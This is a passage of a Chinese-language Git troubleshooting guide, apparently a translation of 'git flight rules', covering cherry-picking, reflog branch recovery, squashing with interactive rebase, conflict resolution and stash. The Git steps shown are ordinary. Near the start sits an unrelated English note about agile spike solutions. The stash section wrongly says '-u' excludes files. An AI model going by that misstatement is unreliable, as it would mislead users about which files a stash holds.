class="comment">#  (use "git reset HEAD &lt;file&gt;..." to unstage)  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#        modified:   file1.txt</span></span><br></pre></td></tr></table></figure><p>然后, 正常提交。</p><blockquote><p>Note: Spike solutions are made to analyze or solve the problem. These solutions are used for estimation and discarded once everyone gets clear visualization of the problem.</p></blockquote><h3 id="我把几个提交-commit-提交到了同一个分支，而这些提交应该分布在不同的分支里"><a href="#我把几个提交-commit-提交到了同一个分支，而这些提交应该分布在不同的分支里" class="headerlink" title="我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里"></a>我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里</h3><p>假设你有一个<code>main</code>分支， 执行<code>git log</code>, 你看到你做过两次提交:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git <span class="built_in">log</span>  </span><br><span class="line">  </span><br><span class="line">commit e3851e817c451cc36f2e6f3049db528415e3c114  </span><br><span class="line">Author: Alex Lee &lt;alexlee@example.com&gt;  </span><br><span class="line">Date:   Tue Jul 22 15:39:27 2014 -0400  </span><br><span class="line">  </span><br><span class="line">    Bug <span class="comment">#21 - Added CSRF protection  </span></span><br><span class="line">  </span><br><span class="line">commit 5ea51731d150f7ddc4a365437931cd8be3bf3131  </span><br><span class="line">Author: Alex Lee &lt;alexlee@example.com&gt;  </span><br><span class="line">Date:   Tue Jul 22 15:39:12 2014 -0400  </span><br><span class="line">  </span><br><span class="line">    Bug <span class="comment">#14 - Fixed spacing on title  </span></span><br><span class="line">  </span><br><span class="line">commit a13b85e984171c6e2a1729bb061994525f626d14  </span><br><span class="line">Author: Aki Rose &lt;akirose@example.com&gt;  </span><br><span class="line">Date:   Tue Jul 21 01:12:48 2014 -0400  </span><br><span class="line">  </span><br><span class="line">    First commit</span><br></pre></td></tr></table></figure><p>让我们用提交hash(commit hash)标记bug (<code>e3851e8</code> for #21, <code>5ea5173</code> for #14).</p><p>首先, 我们把<code>main</code>分支重置到正确的提交(<code>a13b85e</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reset --hard a13b85e  </span><br><span class="line">HEAD is now at a13b85e</span><br></pre></td></tr></table></figure><p>现在, 我们对 <code>bug #21</code> 创建一个新的分支:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git checkout -b 21  </span><br><span class="line">(21)$</span><br></pre></td></tr></table></figure><p>接着, 我们用<code>_cherry-pick_</code>把对<code>bug #21</code>的提交放入当前分支。这意味着我们将应用(apply)这个提交(commit)，仅仅这一个提交(commit)，直接在HEAD上面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(21)$ git cherry-pick e3851e8</span><br></pre></td></tr></table></figure><p>这时候, 这里可能会产生冲突， 参见交互式 rebasing 章 <strong>冲突节</strong> 解决冲突.</p><p>再者， 我们为bug #14 创建一个新的分支, 也基于<code>main</code>分支</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(21)$ git checkout main  </span><br><span class="line">(main)$ git checkout -b 14  </span><br><span class="line">(14)$</span><br></pre></td></tr></table></figure><p>最后, 为 bug #14 执行 <code>cherry-pick</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(14)$ git cherry-pick 5ea5173</span><br></pre></td></tr></table></figure><h3 id="我想删除上游-upstream-分支被删除了的本地分支"><a href="#我想删除上游-upstream-分支被删除了的本地分支" class="headerlink" title="我想删除上游(upstream)分支被删除了的本地分支"></a>我想删除上游(upstream)分支被删除了的本地分支</h3><p>一旦你在github 上面合并(merge)了一个<code>pull request</code>, 你就可以删除你fork里被合并的分支。如果你不准备继续在这个分支里工作, 删除这个分支的本地拷贝会更干净，使你不会陷入工作分支和一堆陈旧分支的混乱之中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch -p</span><br></pre></td></tr></table></figure><h3 id="我不小心删除了我的分支"><a href="#我不小心删除了我的分支" class="headerlink" title="我不小心删除了我的分支"></a>我不小心删除了我的分支</h3><p>如果你定期推送到远程, 多数情况下应该是安全的，但有些时候还是可能删除了还没有推到远程的分支。让我们先创建一个分支和一个新的文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git checkout -b my-branch  </span><br><span class="line">(my-branch)$ git branch  </span><br><span class="line">(my-branch)$ touch foo.txt  </span><br><span class="line">(my-branch)$ ls  </span><br><span class="line">README.md foo.txt</span><br></pre></td></tr></table></figure><p>添加文件并做一次提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git add .  </span><br><span class="line">(my-branch)$ git commit -m <span class="string">'foo.txt added'</span>  </span><br><span class="line">(my-branch)$ foo.txt added  </span><br><span class="line"> 1 files changed, 1 insertions(+)  </span><br><span class="line"> create mode 100644 foo.txt  </span><br><span class="line">(my-branch)$ git <span class="built_in">log</span>  </span><br><span class="line">  </span><br><span class="line">commit 4e3cd85a670ced7cc17a2b5d8d3d809ac88d5012  </span><br><span class="line">Author: siemiatj &lt;siemiatj@example.com&gt;  </span><br><span class="line">Date:   Wed Jul 30 00:34:10 2014 +0200  </span><br><span class="line">  </span><br><span class="line">    foo.txt added  </span><br><span class="line">  </span><br><span class="line">commit 69204cdf0acbab201619d95ad8295928e7f411d5  </span><br><span class="line">Author: Kate Hudson &lt;katehudson@example.com&gt;  </span><br><span class="line">Date:   Tue Jul 29 13:14:46 2014 -0400  </span><br><span class="line">  </span><br><span class="line">    Fixes <span class="comment">#6: Force pushing after amending commits</span></span><br></pre></td></tr></table></figure><p>现在我们切回到主(main)分支，‘不小心的’删除<code>my-branch</code>分支</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git checkout main  </span><br><span class="line">Switched to branch <span class="string">'main'</span>  </span><br><span class="line">Your branch is up-to-date with <span class="string">'origin/main'</span>.  </span><br><span class="line">(main)$ git branch -D my-branch  </span><br><span class="line">Deleted branch my-branch (was 4e3cd85).  </span><br><span class="line">(main)$ <span class="built_in">echo</span> oh noes, deleted my branch!  </span><br><span class="line">oh noes, deleted my branch!</span><br></pre></td></tr></table></figure><p>在这时候你应该想起了<code>reflog</code>, 一个升级版的日志，它存储了仓库(repo)里面所有动作的历史。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reflog  </span><br><span class="line">69204cd HEAD@&#123;0&#125;: checkout: moving from my-branch to main  </span><br><span class="line">4e3cd85 HEAD@&#123;1&#125;: commit: foo.txt added  </span><br><span class="line">69204cd HEAD@&#123;2&#125;: checkout: moving from main to my-branch</span><br></pre></td></tr></table></figure><p>正如你所见，我们有一个来自删除分支的提交hash(commit hash)，接下来看看是否能恢复删除了的分支。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git checkout -b my-branch-help  </span><br><span class="line">Switched to a new branch <span class="string">'my-branch-help'</span>  </span><br><span class="line">(my-branch-help)$ git reset --hard 4e3cd85  </span><br><span class="line">HEAD is now at 4e3cd85 foo.txt added  </span><br><span class="line">(my-branch-help)$ ls  </span><br><span class="line">README.md foo.txt</span><br></pre></td></tr></table></figure><p>看! 我们把删除的文件找回来了。Git的 <code>reflog</code> 在rebasing出错的时候也是同样有用的。</p><h3 id="我想删除一个分支"><a href="#我想删除一个分支" class="headerlink" title="我想删除一个分支"></a>我想删除一个分支</h3><p>删除一个远程分支:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git push origin --delete my-branch</span><br></pre></td></tr></table></figure><p>你也可以:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git push origin :my-branch</span><br></pre></td></tr></table></figure><p>删除一个本地分支:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git branch -D my-branch</span><br></pre></td></tr></table></figure><h3 id="我想从别人正在工作的远程分支签出-checkout-一个分支"><a href="#我想从别人正在工作的远程分支签出-checkout-一个分支" class="headerlink" title="我想从别人正在工作的远程分支签出(checkout)一个分支"></a>我想从别人正在工作的远程分支签出(checkout)一个分支</h3><p>首先, 从远程拉取(fetch) 所有分支:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git fetch --all</span><br></pre></td></tr></table></figure><p>假设你想要从远程的<code>daves</code>分支签出到本地的<code>daves</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git checkout --track origin/daves  </span><br><span class="line">Branch daves <span class="built_in">set</span> up to track remote branch daves from origin.  </span><br><span class="line">Switched to a new branch <span class="string">'daves'</span></span><br></pre></td></tr></table></figure><p>(<code>--track</code> 是 <code>git checkout -b [branch] [remotename]/[branch]</code> 的简写)</p><p>这样就得到了一个<code>daves</code>分支的本地拷贝, 任何推过(pushed)的更新，远程都能看到.</p><h3 id="将远程分支设置为跟踪分支"><a href="#将远程分支设置为跟踪分支" class="headerlink" title="将远程分支设置为跟踪分支"></a>将远程分支设置为跟踪分支</h3><p>首先, 从远程拉取(fetch) 所有分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$  git fetch --all</span><br></pre></td></tr></table></figure><h4 id="如果本地分支不存在"><a href="#如果本地分支不存在" class="headerlink" title="如果本地分支不存在"></a>如果本地分支不存在</h4><p>将远程分支 <code>release</code> 与本地不存在的分支设置跟踪：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch --track release remotes/origin/release</span><br></pre></td></tr></table></figure><p>如果分支已经存在了，则会设置失败。</p><h4 id="如果本地分支已经存在"><a href="#如果本地分支已经存在" class="headerlink" title="如果本地分支已经存在"></a>如果本地分支已经存在</h4><p>将远程分支 <code>release</code> 与本地分支 <code>release</code>设置跟踪：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch --<span class="built_in">set</span>-upstream-to=origin/release release</span><br></pre></td></tr></table></figure><h2 id="标签-Tag"><a href="#标签-Tag" class="headerlink" title="标签(Tag)"></a>标签(Tag)</h2><p>从某个标签(tag）检出一个新的分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h2 id="Rebasing-和合并-Merging"><a href="#Rebasing-和合并-Merging" class="headerlink" title="Rebasing 和合并(Merging)"></a>Rebasing 和合并(Merging)</h2><h3 id="我想撤销rebase-merge"><a href="#我想撤销rebase-merge" class="headerlink" title="我想撤销rebase/merge"></a>我想撤销rebase/merge</h3><p>你可以合并(merge)或rebase了一个错误的分支, 或者完成不了一个进行中的rebase/merge。Git 在进行危险操作的时候会把原始的HEAD保存在一个叫ORIG_HEAD的变量里, 所以要把分支恢复到rebase/merge前的状态是很容易的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git reset --hard ORIG_HEAD</span><br></pre></td></tr></table></figure><h3 id="我已经rebase过-但是我不想强推-force-push"><a href="#我已经rebase过-但是我不想强推-force-push" class="headerlink" title="我已经rebase过, 但是我不想强推(force push)"></a>我已经rebase过, 但是我不想强推(force push)</h3><p>不幸的是，如果你想把这些变化(changes)反应到远程分支上，你就必须得强推(<code>force push</code>)。是因你快进(<code>Fast forward</code>)了提交，改变了Git历史, 远程分支不会接受变化(changes)，除非强推(force push)。</p><p>这就是许多人使用 merge 工作流, 而不是 rebasing 工作流的主要原因之一， 开发者的强推(force push)会使大的团队陷入麻烦。使用时需要注意，一种安全使用 rebase 的方法是，不要把你的变化(changes)反映到远程分支上, 而是按下面的做:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git checkout my-branch  </span><br><span class="line">(my-branch)$ git rebase -i main  </span><br><span class="line">(my-branch)$ git checkout main  </span><br><span class="line">(main)$ git merge --ff-only my-branch</span><br></pre></td></tr></table></figure><h3 id="我需要组合-combine-几个提交-commit"><a href="#我需要组合-combine-几个提交-commit" class="headerlink" title="我需要组合(combine)几个提交(commit)"></a>我需要组合(combine)几个提交(commit)</h3><p>假设你的工作分支将会做对于 <code>main</code> 的pull-request。一般情况下你不关心提交(commit)的时间戳，只想组合 <strong>所有</strong> 提交(commit) 到一个单独的里面, 然后重置(reset)重提交(recommit)。确保主(main)分支是最新的和你的变化都已经提交了, 然后:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git reset --soft main  </span><br><span class="line">(my-branch)$ git commit -am <span class="string">"New awesome feature"</span></span><br></pre></td></tr></table></figure><p>如果你想要更多的控制, 想要保留时间戳, 你需要做交互式rebase (interactive rebase):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git rebase -i main</span><br></pre></td></tr></table></figure><p>如果没有相对的其它分支， 你将不得不相对自己的<code>HEAD</code> 进行 rebase。例如：你想组合最近的两次提交(commit), 你将相对于<code>HEAD~2</code> 进行rebase， 组合最近3次提交(commit), 相对于<code>HEAD~3</code>, 等等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git rebase -i HEAD~2</span><br></pre></td></tr></table></figure><p>在你执行了交互式 rebase的命令(interactive rebase command)后, 你将在你的编辑器里看到类似下面的内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring  </span><br><span class="line">pick 01b2fd8 New awesome feature  </span><br><span class="line">pick b729ad5 fixup  </span><br><span class="line">pick e3851e8 another fix  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Rebase 8074d12..b729ad5 onto 8074d12  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Commands:  </span></span><br><span class="line"><span class="comment">#  p, pick = use commit  </span></span><br><span class="line"><span class="comment">#  r, reword = use commit, but edit the commit message  </span></span><br><span class="line"><span class="comment">#  e, edit = use commit, but stop for amending  </span></span><br><span class="line"><span class="comment">#  s, squash = use commit, but meld into previous commit  </span></span><br><span class="line"><span class="comment">#  f, fixup = like "squash", but discard this commit's log message  </span></span><br><span class="line"><span class="comment">#  x, exec = run command (the rest of the line) using shell  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># These lines can be re-ordered; they are executed from top to bottom.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># If you remove a line here THAT COMMIT WILL BE LOST.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># However, if you remove everything, the rebase will be aborted.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Note that empty commits are commented out</span></span><br></pre></td></tr></table></figure><p>所有以 <code>#</code> 开头的行都是注释, 不会影响 rebase.</p><p>然后，你可以用任何上面命令列表的命令替换 <code>pick</code>, 你也可以通过删除对应的行来删除一个提交(commit)。</p><p>例如, 如果你想 <strong>单独保留最旧(first)的提交(commit),组合所有剩下的到第二个里面</strong>, 你就应该编辑第二个提交(commit)后面的每个提交(commit) 前的单词为 <code>f</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring  </span><br><span class="line">pick 01b2fd8 New awesome feature  </span><br><span class="line">f b729ad5 fixup  </span><br><span class="line">f e3851e8 another fix</span><br></pre></td></tr></table></figure><p>如果你想组合这些提交(commit) <strong>并重命名这个提交(commit)</strong>, 你应该在第二个提交(commit)旁边添加一个<code>r</code>，或者更简单的用<code>s</code> 替代 <code>f</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring  </span><br><span class="line">pick 01b2fd8 New awesome feature  </span><br><span class="line">s b729ad5 fixup  </span><br><span class="line">s e3851e8 another fix</span><br></pre></td></tr></table></figure><p>你可以在接下来弹出的文本提示框里重命名提交(commit)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Newer, awesomer features  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Please enter the commit message for your changes. Lines starting  </span></span><br><span class="line"><span class="comment"># with '#' will be ignored, and an empty message aborts the commit.  </span></span><br><span class="line"><span class="comment"># rebase in progress; onto 8074d12  </span></span><br><span class="line"><span class="comment"># You are currently editing a commit while rebasing branch 'main' on '8074d12'.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Changes to be committed:  </span></span><br><span class="line"><span class="comment"># modified:   README.md  </span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果成功了, 你应该看到类似下面的内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ Successfully rebased and updated refs/heads/main.</span><br></pre></td></tr></table></figure><h4 id="安全合并-merging-策略"><a href="#安全合并-merging-策略" class="headerlink" title="安全合并(merging)策略"></a>安全合并(merging)策略</h4><p><code>--no-commit</code> 执行合并(merge)但不自动提交, 给用户在做提交前检查和修改的机会。<code>no-ff</code> 会为特性分支(feature branch)的存在过留下证据, 保持项目历史一致。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git merge --no-ff --no-commit my-branch</span><br></pre></td></tr></table></figure><h4 id="我需要将一个分支合并成一个提交-commit"><a href="#我需要将一个分支合并成一个提交-commit" class="headerlink" title="我需要将一个分支合并成一个提交(commit)"></a>我需要将一个分支合并成一个提交(commit)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git merge --squash my-branch</span><br></pre></td></tr></table></figure><h4 id="我只想组合-combine-未推的提交-unpushed-commit"><a href="#我只想组合-combine-未推的提交-unpushed-commit" class="headerlink" title="我只想组合(combine)未推的提交(unpushed commit)"></a>我只想组合(combine)未推的提交(unpushed commit)</h4><p>有时候，在将数据推向上游之前，你有几个正在进行的工作提交(commit)。这时候不希望把已经推(push)过的组合进来，因为其他人可能已经有提交(commit)引用它们了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git rebase -i @&#123;u&#125;</span><br></pre></td></tr></table></figure><p>这会产生一次交互式的rebase(interactive rebase), 只会列出没有推(push)的提交(commit)， 在这个列表时进行reorder/fix/squash 都是安全的。</p><h3 id="检查是否分支上的所有提交-commit-都合并-merge-过了"><a href="#检查是否分支上的所有提交-commit-都合并-merge-过了" class="headerlink" title="检查是否分支上的所有提交(commit)都合并(merge)过了"></a>检查是否分支上的所有提交(commit)都合并(merge)过了</h3><p>检查一个分支上的所有提交(commit)是否都已经合并(merge)到了其它分支, 你应该在这些分支的head(或任何 commits)之间做一次diff:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git <span class="built_in">log</span> --graph --left-right --cherry-pick --oneline HEAD...feature/120-on-scroll</span><br></pre></td></tr></table></figure><p>这会告诉你在一个分支里有而另一个分支没有的所有提交(commit), 和分支之间不共享的提交(commit)的列表。另一个做法可以是:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git <span class="built_in">log</span> main ^feature/120-on-scroll --no-merges</span><br></pre></td></tr></table></figure><h3 id="交互式rebase-interactive-rebase-可能出现的问题"><a href="#交互式rebase-interactive-rebase-可能出现的问题" class="headerlink" title="交互式rebase(interactive rebase)可能出现的问题"></a>交互式rebase(interactive rebase)可能出现的问题</h3><h4 id="这个rebase-编辑屏幕出现’noop’"><a href="#这个rebase-编辑屏幕出现’noop’" class="headerlink" title="这个rebase 编辑屏幕出现’noop’"></a>这个rebase 编辑屏幕出现’noop’</h4><p>如果你看到的是这样:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noop</span><br></pre></td></tr></table></figure><p>这意味着你rebase的分支和当前分支在同一个提交(commit)上, 或者 <em>领先(ahead)</em> 当前分支。你可以尝试:</p><ul><li>检查确保主(main)分支没有问题</li><li>rebase  <code>HEAD~2</code> 或者更早</li></ul><h4 id="有冲突的情况"><a href="#有冲突的情况" class="headerlink" title="有冲突的情况"></a>有冲突的情况</h4><p>如果你不能成功的完成rebase, 你可能必须要解决冲突。</p><p>首先执行 <code>git status</code> 找出哪些文件有冲突:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git status  </span><br><span class="line">On branch my-branch  </span><br><span class="line">Changes not staged <span class="keyword">for</span> commit:  </span><br><span class="line">  (use <span class="string">"git add &lt;file&gt;..."</span> to update what will be committed)  </span><br><span class="line">  (use <span class="string">"git checkout -- &lt;file&gt;..."</span> to discard changes <span class="keyword">in</span> working directory)  </span><br><span class="line">  </span><br><span class="line"> modified:   README.md</span><br></pre></td></tr></table></figure><p>在这个例子里面, <code>README.md</code> 有冲突。打开这个文件找到类似下面的内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD  </span><br><span class="line">some code  </span><br><span class="line">=========  </span><br><span class="line">some code  </span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; new-commit</span><br></pre></td></tr></table></figure><p>你需要解决新提交的代码(示例里, 从中间<code>==</code>线到<code>new-commit</code>的地方)与<code>HEAD</code> 之间不一样的地方.</p><p>有时候这些合并非常复杂，你应该使用可视化的差异编辑器(visual diff editor):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main*)$ git mergetool -t opendiff</span><br></pre></td></tr></table></figure><p>在你解决完所有冲突和测试过后, <code>git add</code> 变化了的(changed)文件, 然后用<code>git rebase --continue</code> 继续rebase。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git add README.md  </span><br><span class="line">(my-branch)$ git rebase --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure><p>如果在解决完所有的冲突过后，得到了与提交前一样的结果, 可以执行<code>git rebase --skip</code>。</p><p>任何时候你想结束整个rebase 过程，回来rebase前的分支状态, 你可以做:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git rebase --abort</span><br></pre></td></tr></table></figure><h2 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h2><h3 id="暂存所有改动"><a href="#暂存所有改动" class="headerlink" title="暂存所有改动"></a>暂存所有改动</h3><p>暂存你工作目录下的所有改动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash</span><br></pre></td></tr></table></figure><p>你可以使用<code>-u</code>来排除一些文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash -u</span><br></pre></td></tr></table></figure><h3 id="暂存指定文件"><a href="#暂存指定文件" class="headerlink" title="暂存指定文件"></a>暂存指定文件</h3><p>假设你只想暂存某一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash push working-directory-path/filename.ext</span><br></pre></td></tr></table></figure><p>假设你想暂存多个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash push working-directory-path/filename1.ext working-directory-path/filename2.ext</span><br></pre></td></tr></table></figure><h3 id="暂存时记录消息"><a href="#暂存时记录消息" class="headerlink" title="暂存时记录消息"></a>暂存时记录消息</h3><p>这样你可以在<code>list</code>时看到它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash save &lt;message&gt;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash push -m &lt;message&gt;</span><br></pre></td></tr></table></figure><h3 id="使用某个指定暂存"><a href="#使用某个指定暂存" class="headerlink" title="使用某个指定暂存"></a>使用某个指定暂存</h3><p>首先你可以查看你的<code>stash</code>记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash list</span><br></pre></td></tr></table></figure><p>然后你可以<code>apply</code>某个<code>stash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash apply <span class="string">"stash@&#123;n&#125;"</span></span><br></pre></td></tr></table></figure><p>此处， ‘n’是<code>stash</code>在栈中的位置，最上层的<code>stash</code>会是0</p><p>除此之外，也可以使用时间标记(假如你能记得的话)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash apply <span class="string">"stash@&#123;2.hours.ago&#125;"</span></span><br></pre></td></tr></table></figure><h3 id="暂存时保留未暂存的内容"><a href="#暂存时保留未暂存的内容" class="headerlink" title="暂存时保留未暂存的内容"></a>暂存时保留未暂存的内容</h3><p>你需要手动create一个<code>stash commit</code>， 然后使用<code>git stash store</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git stash create  </span><br><span class="line">$ git stash store -m <span class="string">"commit-message"</span> CREATED_SHA1</span><br></pre></td></tr></table></figure><h2 id="杂项-Miscellaneous-Objects"><a href="#杂项-Miscellaneous-Objects" class="headerlink" title="杂项(Miscellaneous 